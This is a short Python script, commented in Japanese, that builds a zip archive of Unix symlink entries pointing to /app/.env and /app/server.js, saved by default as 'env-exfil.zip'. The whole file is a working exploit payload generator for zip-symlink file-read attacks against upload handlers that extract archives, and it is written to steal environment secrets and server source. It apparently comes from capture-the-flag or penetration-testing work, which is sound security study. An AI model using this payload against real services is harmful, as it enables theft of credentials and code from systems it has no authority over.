#!/usr/bin/env python3

from zipfile import ZipFile, ZipInfo, ZIP_DEFLATED
from datetime import datetime
import stat
import argparse
from pathlib import Path

# 取りたいファイルをここで定義
TARGETS = {
    # .env 想定置き場
    "app_env": "/app/.env",
    "server.js": "/app/server.js",
}

def add_symlink(zf: ZipFile, name: str, target: str):
    zi = ZipInfo(name, date_time=datetime.now().timetuple()[:6])
    zi.create_system = 3  # Unix
    zi.external_attr = (stat.S_IFLNK | 0o777) << 16  # symlink属性
    zi.compress_type = ZIP_DEFLATED
    # symlinkの「中身」にリンク先パス文字列を書き込むのが通例
    zf.writestr(zi, target.encode("utf-8"))

def build(output: Path):
    with ZipFile(output, "w") as z:
        for name, target in TARGETS.items():
            add_symlink(z, name, target)

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("-o", "--output", default="env-exfil.zip",
                    help="output zip filename (default: env-exfil.zip)")
    args = ap.parse_args()
    build(Path(args.output))
    print(f"[+] wrote {args.output}")
